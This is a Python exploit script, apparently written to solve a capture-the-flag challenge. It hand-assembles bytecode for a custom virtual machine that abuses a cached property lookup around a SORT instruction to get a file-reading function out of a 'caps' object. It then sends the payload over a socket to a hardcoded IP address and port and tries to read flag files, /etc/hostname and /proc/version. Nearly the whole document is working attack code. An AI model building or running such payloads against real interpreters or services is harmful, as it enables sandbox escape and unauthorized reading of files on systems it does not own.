import socket
import struct
import time

def p8(x): return struct.pack('<B', x)
def p16(x): return struct.pack('<H', x)

def create_payload(file_path):
    """Create exploit payload to read a file"""
    consts = [
        b"caps",
        file_path.encode(),
    ]

    payload = b""
    payload += p8(0x10)  # 16 registers
    payload += p8(len(consts))

    for c in consts:
        payload += p8(0x02)
        payload += p16(len(c))
        payload += c

    code = b""
    
    # 1. LOADG r0, global["caps"]
    code += p8(0x02) + p8(0x00) + p8(0x00)
    
    # 2. GETPROP r1, r0.c
    code += p8(0x20) + p8(0x01) + p8(0x00) + p8(0x03)
    
    # 3. GETPROPC r2, PC_ID=1, r1, key=10
    code += p8(0x21) + p8(0x02) + p8(0x01) + p8(0x01) + p8(0x0a)
    
    # 4. SORT r1, key=10
    code += p8(0x70) + p8(0x01) + p8(0x0a)
    
    # 5. GETPROPC r3, PC_ID=1, r1, key=10
    code += p8(0x21) + p8(0x03) + p8(0x01) + p8(0x01) + p8(0x0a)
    
    # 6. LOADK r4, file_path
    code += p8(0x01) + p8(0x04) + p8(0x01)
    
    # 7. CALL r5, r3(r4)
    code += p8(0x30) + p8(0x05) + p8(0x03) + p8(0x01) + p8(0x01) + p8(0x04)
    
    # 8. RET r5
    code += p8(0x31) + p8(0x05)

    payload += code
    return payload.hex()

# Try different file paths
file_paths = [
    "/flag.txt",
    "/flag",
    "/challenge/flag.txt",
    "/etc/hostname",
    "/proc/version",
]

HOST = '35.245.96.82'
PORT = 5000

for file_path in file_paths:
    print(f"\n{'='*70}")
    print(f"Trying to read: {file_path}")
    print('='*70)
    
    hex_payload = create_payload(file_path)
    print(f"Payload: {hex_payload}")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        
        s.sendall(hex_payload.encode() + b'\n')
        time.sleep(1)
        
        response = s.recv(8192).decode('utf-8', errors='replace')
        print(f"Response: '{response}'")
        
        if response and response != 'ERR\n' and response.strip():
            print(f"\n🎉 SUCCESS! Flag: {response}")
            break
            
        s.close()
    except socket.timeout:
        print("Timeout")
    except Exception as e:
        print(f"Error: {e}")
